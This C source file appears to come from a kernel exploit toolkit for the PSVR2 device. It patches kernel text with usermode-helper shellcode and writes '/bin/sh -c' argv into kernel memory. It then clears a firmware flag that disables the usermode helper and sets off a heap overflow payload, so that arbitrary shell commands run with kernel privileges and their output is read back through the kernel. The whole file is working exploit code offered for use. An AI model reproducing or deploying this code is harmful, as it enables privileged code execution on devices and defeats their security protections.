#include "shellcode_internal.h"
#include "umh_internal.h"
#include "wait_status_internal.h"

#include "psvr2/kernel_exec.h"
#include "psvr2/kernel_payload.h"

#include <string.h>

_Static_assert(
    PSVR2_UMH_COMMAND_OFFSET + PSVR2_UMH_COMMAND_CAPACITY ==
        PSVR2_UMH_RESULT_OFFSET,
    "UMH command buffer must end at the result slot");
_Static_assert(
    PSVR2_UMH_RESULT_OFFSET + sizeof(uint64_t) <=
        PSVR2_UMH_ARGV_OFFSET,
    "UMH result and argv ranges overlap");
_Static_assert(
    PSVR2_UMH_ARGV_OFFSET + 4U * sizeof(uint64_t) <=
        PSVR2_RUNTIME_DATA_CAPACITY,
    "UMH argv exceeds the runtime data allocation");

static bool install_umh_helpers(psvr2_runtime *runtime) {
    if (runtime->umh.helpers_injected)
        return true;

    psvr2_constants *constants = runtime->krw->ex->constants;
    uint8_t worker[PSVR2_UMH_WORKER_SIZE];
    uint8_t trigger[PSVR2_UMH_TRIGGER_SIZE];
    if (!psvr2_build_umh_worker(constants, worker) ||
        !psvr2_build_umh_trigger(constants, trigger))
        return false;

    const psvr2_kernel_text_patch_request requests[] = {
        {
            .target = constants->umh_worker,
            .data = worker,
            .length = sizeof(worker)
        },
        {
            .target = constants->umh_trigger,
            .data = trigger,
            .length = sizeof(trigger)
        }
    };
    if (!psvr2_kernel_text_patch_many(
            runtime->krw, requests, PSVR2_ARRAY_LEN(requests)))
        return false;
    runtime->umh.helpers_injected = true;
    psvr2_runtime_mark_phase(
        runtime, PSVR2_RUNTIME_HELPERS_READY);
    return true;
}

static bool initialize_umh_static_data(psvr2_runtime *runtime) {
    if (runtime->umh.static_data_initialized)
        return true;

    psvr2_krw *krw = runtime->krw;
    const psvr2_constants *constants = krw->ex->constants;
    if (!psvr2_krw_write_u64_fast(
            krw,
            constants->runtime_data + PSVR2_UMH_SHELL_OFFSET,
            UINT64_C(0x0068732f6e69622f)) ||
        !psvr2_krw_write_u64_fast(
            krw,
            constants->runtime_data + PSVR2_UMH_SHELL_ARG_OFFSET,
            UINT64_C(0x000000000000632d)))
        return false;

    const uint64_t argv[] = {
        constants->runtime_data + PSVR2_UMH_SHELL_OFFSET,
        constants->runtime_data + PSVR2_UMH_SHELL_ARG_OFFSET,
        constants->runtime_data + PSVR2_UMH_COMMAND_OFFSET,
        0
    };
    for (size_t index = 0; index < PSVR2_ARRAY_LEN(argv); ++index)
        if (!psvr2_krw_write_u64_fast(
                krw,
                constants->runtime_data + PSVR2_UMH_ARGV_OFFSET +
                    index * sizeof(uint64_t),
                argv[index]))
            return false;
    runtime->umh.static_data_initialized = true;
    return true;
}

static bool write_umh_command(
    psvr2_runtime *runtime, const char *command, bool capture) {
    char full[PSVR2_UMH_COMMAND_CAPACITY];
    int written;
    if (capture)
        written = snprintf(
            full, sizeof(full),
            "export PATH=/bin:/sbin:/usr/bin:/usr/sbin;"
            "( %s ) > " PSVR2_UMH_OUTPUT_PATH " 2>&1",
            command);
    else
        written = snprintf(
            full, sizeof(full),
            "export PATH=/bin:/sbin:/usr/bin:/usr/sbin;%s",
            command);
    if (written < 0 || (size_t)written >= sizeof(full)) {
        fprintf(
            stderr, "[-] Command exceeds the %zu-byte UMH buffer.\n",
            sizeof(full) - 1U);
        return false;
    }

    const psvr2_constants *constants =
        runtime->krw->ex->constants;
    size_t length = strlen(full) + 1U;
    for (size_t offset = 0; offset < length; offset += 8U) {
        uint8_t word[8] = {0};
        memcpy(
            word, full + offset,
            psvr2_min_size(sizeof(word), length - offset));
        if (!psvr2_krw_write_u64_fast(
                runtime->krw,
                constants->runtime_data +
                    PSVR2_UMH_COMMAND_OFFSET + offset,
                psvr2_load_le64(word)))
            return false;
    }
    return true;
}

static bool reset_umh_work(psvr2_runtime *runtime) {
    const psvr2_constants *constants =
        runtime->krw->ex->constants;
    const uint64_t work[] = {
        PSVR2_UMH_WORK_STATE,
        constants->runtime_work + sizeof(uint64_t),
        constants->runtime_work + sizeof(uint64_t),
        constants->umh_worker
    };
    for (size_t index = 0; index < PSVR2_ARRAY_LEN(work); ++index)
        if (!psvr2_krw_write_u64_fast(
                runtime->krw,
                constants->runtime_work + index * sizeof(uint64_t),
                work[index]))
            return false;
    return true;
}

static bool prepare_umh(
    psvr2_runtime *runtime, const char *command,
    bool capture, bool report_steps) {
    const psvr2_constants *constants =
        runtime->krw->ex->constants;
    double started = psvr2_now();
    bool ok = install_umh_helpers(runtime);
    if (report_steps)
        psvr2_report_timing("UMH helper installation", started, ok);
    if (!ok) return false;

    started = psvr2_now();
    ok = psvr2_krw_write_u64_fast(
        runtime->krw,
        constants->runtime_data + PSVR2_UMH_RESULT_OFFSET,
        PSVR2_UMH_PENDING_RESULT);
    if (report_steps)
        psvr2_report_timing("UMH result reset", started, ok);
    if (!ok) return false;

    started = psvr2_now();
    ok = initialize_umh_static_data(runtime);
    if (report_steps)
        psvr2_report_timing("UMH static-data setup", started, ok);
    if (!ok) return false;

    started = psvr2_now();
    ok = write_umh_command(runtime, command, capture);
    if (report_steps)
        psvr2_report_timing("UMH command staging", started, ok);
    if (!ok) return false;

    started = psvr2_now();
    ok = reset_umh_work(runtime);
    if (report_steps)
        psvr2_report_timing("UMH work-item reset", started, ok);
    return ok;
}

static bool prepare_execution(
    psvr2_runtime *runtime, const char *command,
    bool capture, bool fatal) {
    if (!runtime || !runtime->krw || !command ||
        !runtime->krw->spinlock ||
        !psvr2_runtime_execution_safe(runtime, true))
        return false;
    if (!psvr2_verify_shellcode(runtime, fatal) &&
        !psvr2_inject_str_shellcode(runtime))
        return false;
    if (!psvr2_kernel_workspace_prepare(runtime) ||
        !psvr2_runtime_workspace_safe(runtime, true))
        return false;

    uint64_t disabled =
        psvr2_krw_read_ptr(
            runtime->krw, runtime->krw->ex->constants->fw.umh_disabled);
    if (disabled &&
        !psvr2_krw_write_u64_fast(
            runtime->krw,
            runtime->krw->ex->constants->fw.umh_disabled, 0))
        return false;

    bool first_prepare = !runtime->umh.helpers_injected;
    double started = psvr2_now();
    if (first_prepare)
        puts("[*] Preparing first-use UMH runtime...");
    if (!prepare_umh(
            runtime, command, capture, first_prepare)) {
        if (first_prepare)
            psvr2_report_timing(
                "first-use UMH preparation", started, false);
        return false;
    }
    if (first_prepare)
        psvr2_report_timing(
            "first-use UMH preparation", started, true);
    return true;
}

static bool trigger_umh(psvr2_runtime *runtime) {
    uint8_t payload[PSVR2_WRITE_PAYLOAD_SIZE];
    const psvr2_constants *constants =
        runtime->krw->ex->constants;
    return psvr2_build_fast_write_payload(
               constants, payload,
               constants->runtime_data, constants->runtime_data,
               runtime->krw->spinlock, runtime->krw->regs.x22,
               constants->umh_trigger) == sizeof(payload) &&
           psvr2_krw_trigger_overflow(
               runtime->krw, payload, sizeof(payload), 2500);
}

static bool wait_for_umh_result(
    psvr2_runtime *runtime, int64_t *result) {
    const psvr2_constants *constants =
        runtime->krw->ex->constants;
    double deadline = psvr2_now() + 5.0;
    uint64_t observed = PSVR2_UMH_PENDING_RESULT;
    do {
        uint8_t data[8];
        if (!psvr2_krw_read(
                runtime->krw,
                constants->runtime_data + PSVR2_UMH_RESULT_OFFSET,
                data, sizeof(data)))
            return false;
        observed = psvr2_load_le64(data);
        if (observed != PSVR2_UMH_PENDING_RESULT)
            break;
    } while (psvr2_now() < deadline);
    *result = (int64_t)observed;
    return observed != PSVR2_UMH_PENDING_RESULT;
}

static bool valid_output_dentry(
    psvr2_vfs *vfs, uint64_t dentry) {
    char name[16];
    psvr2_vfs_type type = PSVR2_VFS_ERROR;
    return dentry &&
           psvr2_vfs_dentry_name(vfs, dentry, name, sizeof(name)) &&
           strcmp(name, PSVR2_UMH_OUTPUT_NAME) == 0 &&
           psvr2_vfs_inode_info(vfs, dentry, &type, NULL) &&
           type == PSVR2_VFS_FILE;
}

static bool read_umh_output(
    psvr2_runtime *runtime, psvr2_buffer *output) {
    psvr2_vfs vfs;
    psvr2_vfs_init(&vfs, runtime->krw);

    uint64_t file = runtime->umh.output_dentry;
    if (!valid_output_dentry(&vfs, file)) {
        uint64_t tmp = psvr2_vfs_find_mount(&vfs, "tmp");
        file =
            tmp
                ? psvr2_vfs_resolve_child(
                      &vfs, tmp, PSVR2_UMH_OUTPUT_NAME)
                : 0;
        if (!valid_output_dentry(&vfs, file))
            file = 0;
        runtime->umh.output_dentry = file;
    }
    return file &&
           psvr2_vfs_read_file(
               &vfs, file, output, PSVR2_UMH_OUTPUT_LIMIT);
}

bool psvr2_exec(psvr2_runtime *runtime, const char *command,
                bool capture_output, int64_t *retval,
                psvr2_buffer *output) {
    if (!prepare_execution(
            runtime, command, capture_output, true))
        return false;
    printf("[*] exec: %s\n", command);
    if (!trigger_umh(runtime))
        return false;

    int64_t result = (int64_t)PSVR2_UMH_PENDING_RESULT;
    if (!wait_for_umh_result(runtime, &result)) {
        if (retval) *retval = result;
        return false;
    }
    result = psvr2_remote_exit_status(result);
    if (retval) *retval = result;
    if (capture_output && output)
        (void)read_umh_output(runtime, output);
    return result == 0;
}

bool psvr2_exec_blind(
    psvr2_runtime *runtime, const char *command) {
    return prepare_execution(runtime, command, false, false) &&
           trigger_umh(runtime);
}
